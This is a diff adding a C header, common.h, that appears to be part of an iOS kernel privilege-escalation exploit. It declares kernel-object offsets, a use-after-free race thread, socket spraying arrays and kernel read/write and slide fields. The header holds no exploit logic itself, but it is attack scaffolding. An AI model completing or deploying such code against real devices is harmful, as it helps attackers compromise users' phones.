@@ -1,0 +1,127 @@
+#ifndef common_h
+#define common_h
+
+#include <IOSurface/IOSurfaceRef.h>
+#include <mach/mach.h>
+#include <pthread.h>
+#include <stdatomic.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <sys/syslimits.h>
+#include <sys/uio.h>
+
+#define LOG(fmt, ...) fprintf(stderr, "[i] " fmt "\n", ##__VA_ARGS__)
+#define LOG_ERR(fmt, ...) fprintf(stderr, "[err] " fmt "\n", ##__VA_ARGS__)
+
+#define DEBUG 1  // TODO
+#ifdef DEBUG
+#define LOG_DEBUG(fmt, ...) fprintf(stderr, "[debug] " fmt "\n", ##__VA_ARGS__)
+#else
+#define LOG_DEBUG(fmt, ...)
+#endif
+
+#define TARGET_FILE_SIZE 0x8000  // 2 pages
+#define MAX_OPEN_FDS 10240       // bsd/sys/syslimits.h
+#define MAX_SOCKETS_COUNT 0x5800
+// change this if search mappings count is ever changed, since it's the only thing we mlock
+// this changes in A18 path but we don't support that yet
+#define MAX_LOCKED_SURFACES 8
+#define OS_VERSION_AT_LEAST(major, minor) (g_offsets.ios_major_version > (major) || (g_offsets.ios_major_version == (major) && g_offsets.ios_minor_version >= (minor)))
+
+kern_return_t mach_vm_map(vm_map_t target_task, mach_vm_address_t* address, mach_vm_size_t size, mach_vm_offset_t mask, int flags, mem_entry_name_port_t object, memory_object_offset_t offset,
+                          boolean_t copy, vm_prot_t cur_protection, vm_prot_t max_protection, vm_inherit_t inheritance);
+kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t* address, mach_vm_size_t size, int flags);
+kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);
+
+typedef struct free_thread_shared {
+    _Atomic uint64_t free_thread_start;
+    _Atomic uint64_t free_target_sync;
+    _Atomic uint64_t free_target_size_sync;
+    _Atomic uint64_t target_object_sync;
+    _Atomic uint64_t target_object_offset_sync;
+    _Atomic uint64_t go_sync;
+    _Atomic uint64_t race_sync;
+} free_thread_shared_t;
+
+typedef struct mlock_surfaces {
+    mach_vm_address_t address;
+    IOSurfaceRef surface;
+} mlock_surfaces_t;
+
+typedef struct offsets {
+    uint32_t ios_major_version;
+    uint32_t ios_minor_version;
+    uint64_t inpcb_icmp6filt;
+    uint64_t inpcb_inp_socket;
+    uint64_t socket_so_count;
+    uint64_t socket_so_background_thread;
+    uint64_t thread_t_ro;
+    uint64_t thread_ro_proc;
+    uint64_t proc_p_ro;
+    uint64_t proc_ro_task;
+    uint64_t task_map;
+    uint64_t map_pmap;
+} offsets_t;
+extern offsets_t g_offsets;
+
+typedef struct pe_context {
+    offsets_t offsets;
+
+    char device_machine[256];
+    char* executable_name;  // oracle
+    char read_file_path[PATH_MAX];
+    char write_file_path[PATH_MAX];
+
+    size_t target_file_size;
+    uint64_t oob_offset;
+    uint64_t oob_size;
+    uint64_t n_of_oob_pages;
+
+    mach_vm_address_t pc_address;
+    mach_vm_size_t pc_size;
+    mach_port_t pc_object;
+    mach_vm_address_t free_target;
+    mach_vm_size_t free_target_size;
+
+    int write_fd;
+    int read_fd;
+
+    uint64_t random_marker;
+    uint64_t wired_page_marker;
+
+    free_thread_shared_t* shared;
+    pthread_t free_thread;
+    bool free_thread_started;
+
+    struct iovec iov;
+    uint64_t highiest_success_idx;
+    uint64_t success_read_count;
+
+    int control_socket;
+    int rw_socket;
+    uint64_t control_socket_pcb;
+    uint64_t rw_socket_pcb;
+
+    uint8_t control_data[0x20];
+    // these 2 are only used in 1 func, but we keep them here to stay faithful to original
+    uint8_t early_kwrite64_write_buf[0x20];
+    uint8_t kwrite_length_buffer[0x20];
+
+    uint8_t* default_file_content;
+    uint8_t* getsockopt_read_data;
+
+    bool is_a18_devices;
+    uint64_t kernel_base;
+    uint64_t kernel_slide;
+
+    mach_port_t socket_ports[MAX_SOCKETS_COUNT];    // save output mach port from fileport_makeport
+    uint64_t socket_pcb_ids[MAX_SOCKETS_COUNT];  // save pcb gencnt on this array
+    size_t socket_ports_count;
+
+    mlock_surfaces_t mlock_surfaces[MAX_LOCKED_SURFACES];
+    size_t mlock_surfaces_count;
+} pe_context_t;
+extern pe_context_t g_ctx;
+
+#endif /* common_h */
